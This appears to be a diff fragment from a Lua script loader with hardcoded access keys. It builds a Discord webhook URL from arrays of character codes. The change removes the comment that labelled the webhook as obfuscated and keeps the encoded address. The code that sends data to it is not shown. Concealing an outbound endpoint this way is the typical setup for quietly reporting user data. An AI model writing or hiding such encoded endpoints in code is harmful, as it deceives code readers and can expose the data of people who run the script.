@@ -34,7 +34,7 @@ local scriptMap = {
 local universalKey = "sexisgreat"
 local expiredKey = "uglyisbest"
 
--- 🌐 Webhook (obfuscated)
+
 local a1 = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47}
 local a2 = {97,112,105,47,119,101,98,104,111,111,107,115,47}
 local a3 = {49,51,55,52,54,50,52,48,56,57,57,48,49,49,48,57,50,54,56}
